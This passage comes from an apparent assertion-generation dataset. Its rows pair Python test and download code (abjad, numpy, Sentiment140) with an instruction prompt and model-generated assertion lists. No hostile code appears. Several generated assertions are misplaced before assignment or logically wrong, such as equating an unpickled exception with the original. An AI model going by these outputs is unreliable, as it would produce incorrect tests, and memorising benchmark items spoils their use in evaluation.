    slur = Slur()
    attach(slur, voice[1][:])

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
            {
                c'8 [ (
                d'8 )
            }
            {
                e'8 (
                f'8 ] )
            }
        }
        '''
        )

    old = voice[0]
    del(voice[0])

    ""Container voice is now ...""

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
            {
                e'8 [ (
                f'8 ] )
            }
        }
        '''
        )

    assert inspect_(voice).is_well_formed()

    ""Deleted component is now ...""

    assert systemtools.TestManager.compare(
        old,
        r'''
        {
            c'8 (
            d'8 )
        }
        '''
        )

    assert inspect_(old).is_well_formed()


def test_scoretools_Container___delitem___02():
    r'''Delete 1 leaf in container.
    Spanner structure is preserved.
    '''

    voice = Voice(""c'8 d'8 e'8 f'8"")
    beam = Beam()
    attach(beam, voice[:])

    del(voice[1])

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
            c'8 [
            e'8
            f'8 ]
        }
        '''
        )

    assert inspect_(voice).is_well_formed()


def test_scoretools_Container___delitem___03():
    r'''Delete slice in middle of container.
    '''

    voice = Voice(""c'8 d'8 e'8 f'8"")
    beam = Beam()
    attach(beam, voice[:])

    del(voice[1:3])

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
            c'8 [
            f'8 ]
        }
        '''
        )

    assert inspect_(voice).is_well_formed()


def test_scoretools_Container___delitem___04():
    r'''Delete slice from beginning to middle of container.
    '''

    voice = Voice(""c'8 d'8 e'8 f'8"")
    beam = Beam()
    attach(beam, voice[:])

    del(voice[:2])

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
            e'8 [
            f'8 ]
        }
        '''
        )

    assert inspect_(voice).is_well_formed()


def test_scoretools_Container___delitem___05():
    r'''Delete slice from middle to end of container.
    '''

    voice = Voice(""c'8 d'8 e'8 f'8"")
    beam = Beam()
    attach(beam, voice[:])

    del(voice[2:])

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
            c'8 [
            d'8 ]
        }
        '''
        )

    assert inspect_(voice).is_well_formed()


def test_scoretools_Container___delitem___06():
    r'''Delete slice from beginning to end of container.
    '''

    voice = Voice(""c'8 d'8 e'8 f'8"")
    beam = Beam()
    attach(beam, voice[:])

    del(voice[:])

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
        }
        '''
        )

    assert inspect_(voice).is_well_formed()


def test_scoretools_Container___delitem___07():
    r'''Delete leaf from tuplet.
    '''

    tuplet = scoretools.FixedDurationTuplet(Duration(2, 8), ""c'8 d'8 e'8"")
    beam = Beam()
    attach(beam, tuplet[:])

    del(tuplet[1])

    assert systemtools.TestManager.compare(
        tuplet,
        r'''
        {
            c'8 [
            e'8 ]
        }
        '''
        )

    assert inspect_(tuplet).is_well_formed()


def test_scoretools_Container___delitem___08():
    r'''Delete leaf from nested container.
    '''

    voice = Voice(""c'8 { d'8 e'8 } f'8"")
    beam = Beam()
    attach(beam, voice.select_leaves())
    glissando = spannertools.Glissando()
    attach(glissando, voice.select_leaves())

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
            c'8 [ \glissando
            {
                d'8 \glissando
                e'8 \glissando
            }
            f'8 ]
        }
        '''
        )

    leaf = voice.select_leaves()[1]
    del(voice[1][0])

    assert systemtools.TestManager.compare(
        voice,
        r'''
        \new Voice {
            c'8 [ \glissando
            {
                e'8 \glissando
            }
            f'8 ]
        }
        '''
        )

    assert inspect_(voice).is_well_formed()
    assert inspect_(leaf).is_well_formed()","
1# -*- encoding: utf-8 -*-
2from abjad import *
3
4
5
6def test_scoretools_Container___delitem___01():
7    r'''Delete spanned component.
8    Component withdraws crossing spanners.
9    Component carries covered spanners forward.
10    Operation always leaves all expressions in tact.
11    '''
12
13    voice = Voice(""{ c'8 d'8 } { e'8 f'8 }"")
14    beam = Beam()
15    attach(beam, voice[:])
16    slur = Slur()
17    attach(slur, voice[0][:])
18    slur = Slur()
19    attach(slur, voice[1][:])
20
21        voice,
22        r'''
23        \new Voice {
24            {
25                c'8 [ (
26                d'8 )
27            }
28            {
29                e'8 (
30                f'8 ] )
31            }
32        }
33        '''
34        )
35
36    old = voice[0]
37    del(voice[0])
38
39    ""Container voice is now ...""
40
41        voice,
42        r'''
43        \new Voice {
44            {
45                e'8 [ (
46                f'8 ] )
47            }
48        }
49        '''
50        )
51
52
53    ""Deleted component is now ...""
54
55        old,
56        r'''
57        {
58            c'8 (
59            d'8 )
60        }
61        '''
62        )
63
64
65
66def test_scoretools_Container___delitem___02():
67    r'''Delete 1 leaf in container.
68    Spanner structure is preserved.
69    '''
70
71    voice = Voice(""c'8 d'8 e'8 f'8"")
72    beam = Beam()
73    attach(beam, voice[:])
74
75    del(voice[1])
76
77        voice,
78        r'''
79        \new Voice {
80            c'8 [
81            e'8
82            f'8 ]
83        }
84        '''
85        )
86
87
88
89def test_scoretools_Container___delitem___03():
90    r'''Delete slice in middle of container.
91    '''
92
93    voice = Voice(""c'8 d'8 e'8 f'8"")
94    beam = Beam()
95    attach(beam, voice[:])
96
97    del(voice[1:3])
98
99        voice,
100        r'''
101        \new Voice {
102            c'8 [
103            f'8 ]
104        }
105        '''
106        )
107
108
109
110def test_scoretools_Container___delitem___04():
111    r'''Delete slice from beginning to middle of container.
112    '''
113
114    voice = Voice(""c'8 d'8 e'8 f'8"")
115    beam = Beam()
116    attach(beam, voice[:])
117
118    del(voice[:2])
119
120        voice,
121        r'''
122        \new Voice {
123            e'8 [
124            f'8 ]
125        }
126        '''
127        )
128
129
130
131def test_scoretools_Container___delitem___05():
132    r'''Delete slice from middle to end of container.
133    '''
134
135    voice = Voice(""c'8 d'8 e'8 f'8"")
136    beam = Beam()
137    attach(beam, voice[:])
138
139    del(voice[2:])
140
141        voice,
142        r'''
143        \new Voice {
144            c'8 [
145            d'8 ]
146        }
147        '''
148        )
149
150
151
152def test_scoretools_Container___delitem___06():
153    r'''Delete slice from beginning to end of container.
154    '''
155
156    voice = Voice(""c'8 d'8 e'8 f'8"")
157    beam = Beam()
158    attach(beam, voice[:])
159
160    del(voice[:])
161
162        voice,
163        r'''
164        \new Voice {
165        }
166        '''
167        )
168
169
170
171def test_scoretools_Container___delitem___07():
172    r'''Delete leaf from tuplet.
173    '''
174
175    tuplet = scoretools.FixedDurationTuplet(Duration(2, 8), ""c'8 d'8 e'8"")
176    beam = Beam()
177    attach(beam, tuplet[:])
178
179    del(tuplet[1])
180
181        tuplet,
182        r'''
183        {
184            c'8 [
185            e'8 ]
186        }
187        '''
188        )
189
190
191
192def test_scoretools_Container___delitem___08():
193    r'''Delete leaf from nested container.
194    '''
195
196    voice = Voice(""c'8 { d'8 e'8 } f'8"")
197    beam = Beam()
198    attach(beam, voice.select_leaves())
199    glissando = spannertools.Glissando()
200    attach(glissando, voice.select_leaves())
201
202        voice,
203        r'''
204        \new Voice {
205            c'8 [ \glissando
206            {
207                d'8 \glissando
208                e'8 \glissando
209            }
210            f'8 ]
211        }
212        '''
213        )
214
215    leaf = voice.select_leaves()[1]
216    del(voice[1][0])
217
218        voice,
219        r'''
220        \new Voice {
221            c'8 [ \glissando
222            {
223                e'8 \glissando
224            }
225            f'8 ]
226        }
227        '''
228        )
229","[['systemtools.TestManager.compare(', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(voice).is_well_formed()', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(old).is_well_formed()', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(voice).is_well_formed()', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(voice).is_well_formed()', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(voice).is_well_formed()', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(voice).is_well_formed()', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(voice).is_well_formed()', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(tuplet).is_well_formed()', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['systemtools.TestManager.compare(', '==', 'True'], ['inspect_(voice).is_well_formed()', '==', 'True'], ['inspect_(leaf).is_well_formed()', '==', 'True']]",21,21,1.0,0.0044154751892346,"['voice', 'beam', 'slur', 'old', 'tuplet', 'glissando', 'leaf']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['voice', 'beam', 'slur', 'old', 'tuplet', 'glissando', 'leaf']
*Code:

1# -*- encoding: utf-8 -*-
2from abjad import *
3
4
5
6def test_scoretools_Container___delitem___01():
7    r'''Delete spanned component.
8    Component withdraws crossing spanners.
9    Component carries covered spanners forward.
10    Operation always leaves all expressions in tact.
11    '''
12
13    voice = Voice(""{ c'8 d'8 } { e'8 f'8 }"")
14    beam = Beam()
15    attach(beam, voice[:])
16    slur = Slur()
17    attach(slur, voice[0][:])
18    slur = Slur()
19    attach(slur, voice[1][:])
20
21        voice,
22        r'''
23        \new Voice {
24            {
25                c'8 [ (
26                d'8 )
27            }
28            {
29                e'8 (
30                f'8 ] )
31            }
32        }
33        '''
34        )
35
36    old = voice[0]
37    del(voice[0])
38
39    ""Container voice is now ...""
40
41        voice,
42        r'''
43        \new Voice {
44            {
45                e'8 [ (
46                f'8 ] )
47            }
48        }
49        '''
50        )
51
52
53    ""Deleted component is now ...""
54
55        old,
56        r'''
57        {
58            c'8 (
59            d'8 )
60        }
61        '''
62        )
63
64
65
66def test_scoretools_Container___delitem___02():
67    r'''Delete 1 leaf in container.
68    Spanner structure is preserved.
69    '''
70
71    voice = Voice(""c'8 d'8 e'8 f'8"")
72    beam = Beam()
73    attach(beam, voice[:])
74
75    del(voice[1])
76
77        voice,
78        r'''
79        \new Voice {
80            c'8 [
81            e'8
82            f'8 ]
83        }
84        '''
85        )
86
87
88
89def test_scoretools_Container___delitem___03():
90    r'''Delete slice in middle of container.
91    '''
92
93    voice = Voice(""c'8 d'8 e'8 f'8"")
94    beam = Beam()
95    attach(beam, voice[:])
96
97    del(voice[1:3])
98
99        voice,
100        r'''
101        \new Voice {
102            c'8 [
103            f'8 ]
104        }
105        '''
106        )
107
108
109
110def test_scoretools_Container___delitem___04():
111    r'''Delete slice from beginning to middle of container.
112    '''
113
114    voice = Voice(""c'8 d'8 e'8 f'8"")
115    beam = Beam()
116    attach(beam, voice[:])
117
118    del(voice[:2])
119
120        voice,
121        r'''
122        \new Voice {
123            e'8 [
124            f'8 ]
125        }
126        '''
127        )
128
129
130
131def test_scoretools_Container___delitem___05():
132    r'''Delete slice from middle to end of container.
133    '''
134
135    voice = Voice(""c'8 d'8 e'8 f'8"")
136    beam = Beam()
137    attach(beam, voice[:])
138
139    del(voice[2:])
140
141        voice,
142        r'''
143        \new Voice {
144            c'8 [
145            d'8 ]
146        }
147        '''
148        )
149
150
151
152def test_scoretools_Container___delitem___06():
153    r'''Delete slice from beginning to end of container.
154    '''
155
156    voice = Voice(""c'8 d'8 e'8 f'8"")
157    beam = Beam()
158    attach(beam, voice[:])
159
160    del(voice[:])
161
162        voice,
163        r'''
164        \new Voice {
165        }
166        '''
167        )
168
169
170
171def test_scoretools_Container___delitem___07():
172    r'''Delete leaf from tuplet.
173    '''
174
175    tuplet = scoretools.FixedDurationTuplet(Duration(2, 8), ""c'8 d'8 e'8"")
176    beam = Beam()
177    attach(beam, tuplet[:])
178
179    del(tuplet[1])
180
181        tuplet,
182        r'''
183        {
184            c'8 [
185            e'8 ]
186        }
187        '''
188        )
189
190
191
192def test_scoretools_Container___delitem___08():
193    r'''Delete leaf from nested container.
194    '''
195
196    voice = Voice(""c'8 { d'8 e'8 } f'8"")
197    beam = Beam()
198    attach(beam, voice.select_leaves())
199    glissando = spannertools.Glissando()
200    attach(glissando, voice.select_leaves())
201
202        voice,
203        r'''
204        \new Voice {
205            c'8 [ \glissando
206            {
207                d'8 \glissando
208                e'8 \glissando
209            }
210            f'8 ]
211        }
212        '''
213        )
214
215    leaf = voice.select_leaves()[1]
216    del(voice[1][0])
217
218        voice,
219        r'''
220        \new Voice {
221            c'8 [ \glissando
222            {
223                e'8 \glissando
224            }
225            f'8 ]
226        }
227        '''
228        )
229",5857,"[13, 'voice', '!=', None, ""A voice must be assigned and not be None""],
[14, 'beam', '!=', None, ""A beam must be assigned and not be None""],
[16, 'slur', '!=', None, ""A slur must be assigned and not be None""],
[36, 'old', '!=', None, ""Old must be assigned and not be None""],
[68, 'beam', '!=', None, ""A beam must be assigned and not be None""],
[70, 'voice', '!=', None, ""A voice must be assigned and not be None""],
[91, 'voice', '!=', None, ""A voice must be assigned and not be None""],
[94, 'beam', '!=', None, ""A beam must be assigned and not be None""],
[113, 'voice', '!=', None, ""A voice must be assigned and not be None""],
[115, 'beam', '!=', None, ""A beam must be assigned and not be None""],
[135, 'voice', '!=', None, ""A voice must be assigned and not be None""],
[137, 'beam', '!=', None, ""A beam must be assigned and not be None""],
[157, 'voice', '!=', None, ""A voice must be assigned and not be None""],
[159, 'beam', '!=', None, ""A beam must be assigned and not be None""],
[176, 'tuplet', '!=', None, ""A tuplet must be assigned and not be None""],
[177, 'beam', '!=', None, ""A beam must be assigned and not be None""],
[197, 'voice', '!=', None, ""A voice must be assigned and not be None""],
[198, 'beam', '!=', None, ""A beam must be assigned and not be None""],
[199, 'glissando', '!=', None, ""A glissando must be assigned and not be None""],
[215, 'leaf', '!=', None, ""A leaf must be assigned and not be None""]"
ryfeus/lambda-packs,"""""""
Tests of the ._exceptions module. Primarily for exercising the __str__ methods.
""""""

import pickle

import numpy as np

_ArrayMemoryError = np.core._exceptions._ArrayMemoryError
_UFuncNoLoopError = np.core._exceptions._UFuncNoLoopError

class TestArrayMemoryError:
    def test_pickling(self):
        """""" Test that _ArrayMemoryError can be pickled """"""
        error = _ArrayMemoryError((1023,), np.dtype(np.uint8))
        res = pickle.loads(pickle.dumps(error))
        assert res._total_size == error._total_size

    def test_str(self):
        e = _ArrayMemoryError((1023,), np.dtype(np.uint8))
        str(e)  # not crashing is enough

    # testing these properties is easier than testing the full string repr
    def test__size_to_string(self):
        """""" Test e._size_to_string """"""
        f = _ArrayMemoryError._size_to_string
        Ki = 1024
        assert f(0) == '0 bytes'
        assert f(1) == '1 bytes'
        assert f(1023) == '1023 bytes'
        assert f(Ki) == '1.00 KiB'
        assert f(Ki+1) == '1.00 KiB'
        assert f(10*Ki) == '10.0 KiB'
        assert f(int(999.4*Ki)) == '999. KiB'
        assert f(int(1023.4*Ki)) == '1023. KiB'
        assert f(int(1023.5*Ki)) == '1.00 MiB'
        assert f(Ki*Ki) == '1.00 MiB'

        # 1023.9999 Mib should round to 1 GiB
        assert f(int(Ki*Ki*Ki*0.9999)) == '1.00 GiB'
        assert f(Ki*Ki*Ki*Ki*Ki*Ki) == '1.00 EiB'
        # larger than sys.maxsize, adding larger prefices isn't going to help
        # anyway.
        assert f(Ki*Ki*Ki*Ki*Ki*Ki*123456) == '123456. EiB'

    def test__total_size(self):
        """""" Test e._total_size """"""
        e = _ArrayMemoryError((1,), np.dtype(np.uint8))
        assert e._total_size == 1

        e = _ArrayMemoryError((2, 4), np.dtype((np.uint64, 16)))
        assert e._total_size == 1024


class TestUFuncNoLoopError:
    def test_pickling(self):
        """""" Test that _UFuncNoLoopError can be pickled """"""
        assert isinstance(pickle.dumps(_UFuncNoLoopError), bytes)
","
1""""""
2Tests of the ._exceptions module. Primarily for exercising the __str__ methods.
3""""""
4
5import pickle
6
7import numpy as np
8
9_ArrayMemoryError = np.core._exceptions._ArrayMemoryError
10_UFuncNoLoopError = np.core._exceptions._UFuncNoLoopError
11
12class TestArrayMemoryError:
13    def test_pickling(self):
14        """""" Test that _ArrayMemoryError can be pickled """"""
15        error = _ArrayMemoryError((1023,), np.dtype(np.uint8))
16        res = pickle.loads(pickle.dumps(error))
17
18    def test_str(self):
19        e = _ArrayMemoryError((1023,), np.dtype(np.uint8))
20        str(e)  # not crashing is enough
21
22    # testing these properties is easier than testing the full string repr
23    def test__size_to_string(self):
24        """""" Test e._size_to_string """"""
25        f = _ArrayMemoryError._size_to_string
26        Ki = 1024
27
28        # 1023.9999 Mib should round to 1 GiB
29        # larger than sys.maxsize, adding larger prefices isn't going to help
30        # anyway.
31
32    def test__total_size(self):
33        """""" Test e._total_size """"""
34        e = _ArrayMemoryError((1,), np.dtype(np.uint8))
35
36        e = _ArrayMemoryError((2, 4), np.dtype((np.uint64, 16)))
37
38
39class TestUFuncNoLoopError:
40    def test_pickling(self):
41        """""" Test that _UFuncNoLoopError can be pickled """"""
42","[['res._total_size', '==', 'error._total_size'], ['f(0)', '==', ""'0 bytes'""], ['f(1)', '==', ""'1 bytes'""], ['f(1023)', '==', ""'1023 bytes'""], ['f(Ki)', '==', ""'1.00 KiB'""], ['f(Ki+1)', '==', ""'1.00 KiB'""], ['f(10*Ki)', '==', ""'10.0 KiB'""], ['f(int(999.4*Ki))', '==', ""'999. KiB'""], ['f(int(1023.4*Ki))', '==', ""'1023. KiB'""], ['f(int(1023.5*Ki))', '==', ""'1.00 MiB'""], ['f(Ki*Ki)', '==', ""'1.00 MiB'""], ['f(int(Ki*Ki*Ki*0.9999))', '==', ""'1.00 GiB'""], ['f(Ki*Ki*Ki*Ki*Ki*Ki)', '==', ""'1.00 EiB'""], ['f(Ki*Ki*Ki*Ki*Ki*Ki*123456)', '==', ""'123456. EiB'""], ['e._total_size', '==', '1'], ['e._total_size', '==', '1024']]",17,16,0.9411764705882352,0.0079800498753117,"['_ArrayMemoryError', '_UFuncNoLoopError', 'error', 'res', 'e', 'f', 'Ki']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['_ArrayMemoryError', '_UFuncNoLoopError', 'error', 'res', 'e', 'f', 'Ki']
*Code:

1""""""
2Tests of the ._exceptions module. Primarily for exercising the __str__ methods.
3""""""
4
5import pickle
6
7import numpy as np
8
9_ArrayMemoryError = np.core._exceptions._ArrayMemoryError
10_UFuncNoLoopError = np.core._exceptions._UFuncNoLoopError
11
12class TestArrayMemoryError:
13    def test_pickling(self):
14        """""" Test that _ArrayMemoryError can be pickled """"""
15        error = _ArrayMemoryError((1023,), np.dtype(np.uint8))
16        res = pickle.loads(pickle.dumps(error))
17
18    def test_str(self):
19        e = _ArrayMemoryError((1023,), np.dtype(np.uint8))
20        str(e)  # not crashing is enough
21
22    # testing these properties is easier than testing the full string repr
23    def test__size_to_string(self):
24        """""" Test e._size_to_string """"""
25        f = _ArrayMemoryError._size_to_string
26        Ki = 1024
27
28        # 1023.9999 Mib should round to 1 GiB
29        # larger than sys.maxsize, adding larger prefices isn't going to help
30        # anyway.
31
32    def test__total_size(self):
33        """""" Test e._total_size """"""
34        e = _ArrayMemoryError((1,), np.dtype(np.uint8))
35
36        e = _ArrayMemoryError((2, 4), np.dtype((np.uint64, 16)))
37
38
39class TestUFuncNoLoopError:
40    def test_pickling(self):
41        """""" Test that _UFuncNoLoopError can be pickled """"""
42",2789,"[[15, 'error', '!=', None, ""the error object should be correctly initialized""], [16, 'res', '==', 'error', ""pickling and unloading should not alter the object""], [34, 'e', '!=', None, ""the e object should be correctly initialized""], [36, 'e', '!=', None, ""the e object should be correctly initialized""]]"
ky822/nyu_ml_lectures,"import os
try:
    from urllib.request import urlopen
except ImportError:
    from urllib import urlopen

import zipfile


SENTIMENT140_URL = (""http://cs.stanford.edu/people/alecmgo/""
                    ""trainingandtestdata.zip"")
SENTIMENT140_ARCHIVE_NAME = ""trainingandtestdata.zip""


def get_datasets_folder():
    here = os.path.dirname(__file__)
    notebooks = os.path.join(here, 'notebooks')
    datasets_folder = os.path.abspath(os.path.join(notebooks, 'datasets'))
    datasets_archive = os.path.abspath(os.path.join(notebooks, 'datasets.zip'))

    if not os.path.exists(datasets_folder):
        if os.path.exists(datasets_archive):
            print(""Extracting "" + datasets_archive)
            zf = zipfile.ZipFile(datasets_archive)
            zf.extractall('.')
            assert os.path.exists(datasets_folder)
        else:
            print(""Creating datasets folder: "" + datasets_folder)
            os.makedirs(datasets_folder)
    else:
        print(""Using existing dataset folder:"" + datasets_folder)
    return datasets_folder


def check_sentiment140(datasets_folder):
    print(""Checking availability of the sentiment 140 dataset"")
    archive_path = os.path.join(datasets_folder, SENTIMENT140_ARCHIVE_NAME)
    sentiment140_path = os.path.join(datasets_folder, 'sentiment140')
    train_path = os.path.join(sentiment140_path,
                              'training.1600000.processed.noemoticon.csv')
    test_path = os.path.join(sentiment140_path,
                             'testdata.manual.2009.06.14.csv')

    if not os.path.exists(sentiment140_path):
        if not os.path.exists(archive_path):
            print(""Downloading dataset from %s (77MB)"" % SENTIMENT140_URL)
            opener = urlopen(SENTIMENT140_URL)
            open(archive_path, 'wb').write(opener.read())
        else:
            print(""Found archive: "" + archive_path)

        print(""Extracting %s to %s"" % (archive_path, sentiment140_path))
        zf = zipfile.ZipFile(archive_path)
        zf.extractall(sentiment140_path)
    print(""Checking that the sentiment 140 CSV files exist..."")
    assert os.path.exists(train_path)
    assert os.path.exists(test_path)
    print(""=> Success!"")


if __name__ == ""__main__"":
    datasets_folder = get_datasets_folder()
    check_sentiment140(datasets_folder)

    print(""Loading Labeled Faces Data (~200MB)"")
    from sklearn.datasets import fetch_lfw_people
    fetch_lfw_people(min_faces_per_person=70, resize=0.4,
                     data_home=datasets_folder)
    print(""=> Success!"")
","
1import os
2try:
3    from urllib.request import urlopen
4except ImportError:
5    from urllib import urlopen
6
7import zipfile
8
9
10SENTIMENT140_URL = (""http://cs.stanford.edu/people/alecmgo/""
11                    ""trainingandtestdata.zip"")
12SENTIMENT140_ARCHIVE_NAME = ""trainingandtestdata.zip""
13
14
15def get_datasets_folder():
16    here = os.path.dirname(__file__)
17    notebooks = os.path.join(here, 'notebooks')
18    datasets_folder = os.path.abspath(os.path.join(notebooks, 'datasets'))
19    datasets_archive = os.path.abspath(os.path.join(notebooks, 'datasets.zip'))
20
21    if not os.path.exists(datasets_folder):
22        if os.path.exists(datasets_archive):
23            print(""Extracting "" + datasets_archive)
24            zf = zipfile.ZipFile(datasets_archive)
25            zf.extractall('.')
26        else:
27            print(""Creating datasets folder: "" + datasets_folder)
28            os.makedirs(datasets_folder)
29    else:
30        print(""Using existing dataset folder:"" + datasets_folder)
31    return datasets_folder
32
33
34def check_sentiment140(datasets_folder):
35    print(""Checking availability of the sentiment 140 dataset"")
36    archive_path = os.path.join(datasets_folder, SENTIMENT140_ARCHIVE_NAME)
37    sentiment140_path = os.path.join(datasets_folder, 'sentiment140')
38    train_path = os.path.join(sentiment140_path,
39                              'training.1600000.processed.noemoticon.csv')
40    test_path = os.path.join(sentiment140_path,
41                             'testdata.manual.2009.06.14.csv')
42
43    if not os.path.exists(sentiment140_path):
44        if not os.path.exists(archive_path):
45            print(""Downloading dataset from %s (77MB)"" % SENTIMENT140_URL)
46            opener = urlopen(SENTIMENT140_URL)
47            open(archive_path, 'wb').write(opener.read())
48        else:
49            print(""Found archive: "" + archive_path)
50
51        print(""Extracting %s to %s"" % (archive_path, sentiment140_path))
52        zf = zipfile.ZipFile(archive_path)
53        zf.extractall(sentiment140_path)
54    print(""Checking that the sentiment 140 CSV files exist..."")
55    print(""=> Success!"")
56
57
58if __name__ == ""__main__"":
59    datasets_folder = get_datasets_folder()
60    check_sentiment140(datasets_folder)
61
62    print(""Loading Labeled Faces Data (~200MB)"")
63    from sklearn.datasets import fetch_lfw_people
64    fetch_lfw_people(min_faces_per_person=70, resize=0.4,
65                     data_home=datasets_folder)
66    print(""=> Success!"")
67","[['os.path.exists(datasets_folder)', '==', 'True'], ['os.path.exists(train_path)', '==', 'True'], ['os.path.exists(test_path)', '==', 'True']]",3,3,1.0,0.0011787819253438,"['SENTIMENT140_URL', 'SENTIMENT140_ARCHIVE_NAME', 'here', 'notebooks', 'datasets_folder', 'datasets_archive', 'zf', 'archive_path', 'sentiment140_path', 'train_path', 'test_path', 'opener']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['SENTIMENT140_URL', 'SENTIMENT140_ARCHIVE_NAME', 'here', 'notebooks', 'datasets_folder', 'datasets_archive', 'zf', 'archive_path', 'sentiment140_path', 'train_path', 'test_path', 'opener']
*Code:

1import os
2try:
3    from urllib.request import urlopen
4except ImportError:
5    from urllib import urlopen
6
7import zipfile
8
9
10SENTIMENT140_URL = (""http://cs.stanford.edu/people/alecmgo/""
11                    ""trainingandtestdata.zip"")
12SENTIMENT140_ARCHIVE_NAME = ""trainingandtestdata.zip""
13
14
15def get_datasets_folder():
16    here = os.path.dirname(__file__)
17    notebooks = os.path.join(here, 'notebooks')
18    datasets_folder = os.path.abspath(os.path.join(notebooks, 'datasets'))
19    datasets_archive = os.path.abspath(os.path.join(notebooks, 'datasets.zip'))
20
21    if not os.path.exists(datasets_folder):
22        if os.path.exists(datasets_archive):
23            print(""Extracting "" + datasets_archive)
24            zf = zipfile.ZipFile(datasets_archive)
25            zf.extractall('.')
26        else:
27            print(""Creating datasets folder: "" + datasets_folder)
28            os.makedirs(datasets_folder)
29    else:
30        print(""Using existing dataset folder:"" + datasets_folder)
31    return datasets_folder
32
33
34def check_sentiment140(datasets_folder):
35    print(""Checking availability of the sentiment 140 dataset"")
36    archive_path = os.path.join(datasets_folder, SENTIMENT140_ARCHIVE_NAME)
37    sentiment140_path = os.path.join(datasets_folder, 'sentiment140')
38    train_path = os.path.join(sentiment140_path,
39                              'training.1600000.processed.noemoticon.csv')
40    test_path = os.path.join(sentiment140_path,
41                             'testdata.manual.2009.06.14.csv')
42
43    if not os.path.exists(sentiment140_path):
44        if not os.path.exists(archive_path):
45            print(""Downloading dataset from %s (77MB)"" % SENTIMENT140_URL)
46            opener = urlopen(SENTIMENT140_URL)
47            open(archive_path, 'wb').write(opener.read())
48        else:
49            print(""Found archive: "" + archive_path)
50
51        print(""Extracting %s to %s"" % (archive_path, sentiment140_path))
52        zf = zipfile.ZipFile(archive_path)
53        zf.extractall(sentiment140_path)
54    print(""Checking that the sentiment 140 CSV files exist..."")
55    print(""=> Success!"")
56
57
58if __name__ == ""__main__"":
59    datasets_folder = get_datasets_folder()
60    check_sentiment140(datasets_folder)
61
62    print(""Loading Labeled Faces Data (~200MB)"")
63    from sklearn.datasets import fetch_lfw_people
64    fetch_lfw_people(min_faces_per_person=70, resize=0.4,
65                     data_home=datasets_folder)
66    print(""=> Success!"")
67",4114,"[[15, 'here', '!=', None, 'the directory of the current file should not be None'],
 [16, 'notebooks', '!=', None, 'the notebooks should not be None'],
 [18, 'datasets_folder', '!=', None, 'the datasets_folder should not be None'],
 [19, 'datasets_archive', '!=', None, 'the datasets_archive should not be None'],
 [26, 'datasets_folder', '!=', None, 'the datasets_folder should not be None after creation'],
 [37, 'archive_path', '!=', None, 'the archive_path should not be None'],
 [38, 'sentiment140_path', '!=', None, 'the sentiment140_path should not be None'],
